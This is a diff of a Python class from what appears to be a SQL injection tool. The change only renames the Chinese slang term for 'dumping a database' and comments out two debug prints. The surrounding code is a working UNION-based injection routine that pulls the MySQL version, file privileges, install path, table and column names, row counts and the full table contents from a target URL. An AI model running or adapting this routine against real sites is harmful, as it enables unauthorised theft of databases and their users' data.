@@ -18,41 +18,41 @@ class InjUnion(HTTP):
 
     def Print(self, text):
         self._lock.acquire()
-        print(f'>>{self._threadname} 联合脱裤：{text}')
+        print(f'>>{self._threadname} 联合脱库：{text}')
         self._lock.release()
         pass
 
     def _db_init(self) -> bool:
         """
-        函数：用于脱裤-系统数据库
+        函数：用于脱库-系统数据库
 
-        :return: T/F=返回是否脱裤成功
+        :return: T/F=返回是否脱库成功
         """
         if self._url is None:
             return False
 
-        # 脱裤_数据库版本
+        # 脱库_数据库版本
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',@@VERSION,char(126))'.format(Global_spilt),
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['系统数据库版本'] = data
 
-        # 脱裤_数据库文件权限
+        # 脱库_数据库文件权限
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',@@secure_file_priv,char(126))'.format(Global_spilt),
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['系统数据库文件权限'] = data
 
-        # 脱裤_数据库安装路径
+        # 脱库_数据库安装路径
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',@@basedir,char(126))'.format(Global_spilt),
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['系统数据库安装路径'] = data
 
-        # 脱裤_系统数据库db总数
+        # 脱库_系统数据库db总数
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',({1}),char(126))'.format(
@@ -61,7 +61,7 @@ class InjUnion(HTTP):
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['系统数据库db总数'] = data
 
-        # 脱裤_系统数据库tb总数
+        # 脱库_系统数据库tb总数
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',({1}),char(126))'.format(
@@ -70,7 +70,7 @@ class InjUnion(HTTP):
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['系统数据库tb总数'] = data
 
-        # 脱裤_本数据库db名
+        # 脱库_本数据库db名
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',({1}),char(126))'.format(
@@ -79,7 +79,7 @@ class InjUnion(HTTP):
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['本数据库db名'] = data
 
-        # 脱裤_本数据库tb数
+        # 脱库_本数据库tb数
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',({1}),char(126))'.format(
@@ -89,7 +89,7 @@ class InjUnion(HTTP):
                 '{0}(.*?)~'.format(Global_spilt)):
             self._db['本数据库tb数'] = data
 
-        # 脱裤_本数据库tb名
+        # 脱库_本数据库tb名
         if data := self.GET_RE(
                 self._url,
                 'concat(\'{0}\',({1}),char(126))'.format(
@@ -106,16 +106,16 @@ class InjUnion(HTTP):
 
     def _db_table(self) -> bool:
         """
-        函数：脱裤->数据库
+        函数：脱库->数据库
 
-        :return: T/F=成功脱裤
+        :return: T/F=成功脱库
         """
 
         for tb_name in self._db['本数据库tb名'].split(','):
-            print('脱裤->', tb_name)
+            # print('脱库->', tb_name)
             columns, row_max = '', 0
 
-            # 脱裤_列名
+            # 脱库_列名
             if data := self.GET_RE(
                     self._url,
                     'concat(\'{0}\',({1}),char(126))'.format(
@@ -126,7 +126,7 @@ class InjUnion(HTTP):
                 columns = data.split(',')
                 self._tbs[tb_name] = [['行'] + columns]
 
-            # 脱裤_行数
+            # 脱库_行数
             if data := self.GET_RE(
                     self._url,
                     'concat(\'{0}\',({1}),char(126))'.format(
@@ -142,7 +142,7 @@ class InjUnion(HTTP):
             for column in columns:
                 if row_max == 0:
                     break
-                print(f'\t{row_max=},{column}')
+                # print(f'\t{row_max=},{column}')
 
                 if data := self.GET_RE(
                         self._url,
@@ -170,16 +170,16 @@ class InjUnion(HTTP):
         :param Name: 线程名
         :param Info: 传入的信息字典
         """
-        if '脱裤' in Info:
+        if '脱库' in Info:
             return
         Info['注入方式']['EXP'] = '基于联合注入'
-        Info['脱裤'] = {'数据库': {}, '数据表': {}}
+        Info['脱库'] = {'数据库': {}, '数据表': {}}
 
         self._lock = Lock
         self._threadname = Name
         self._url = Info['注入方式']['基于联合注入']
-        self._db = Info['脱裤']['数据库']
-        self._tbs = Info['脱裤']['数据表']
+        self._db = Info['脱库']['数据库']
+        self._tbs = Info['脱库']['数据表']
         self._db_init()
         pass
 
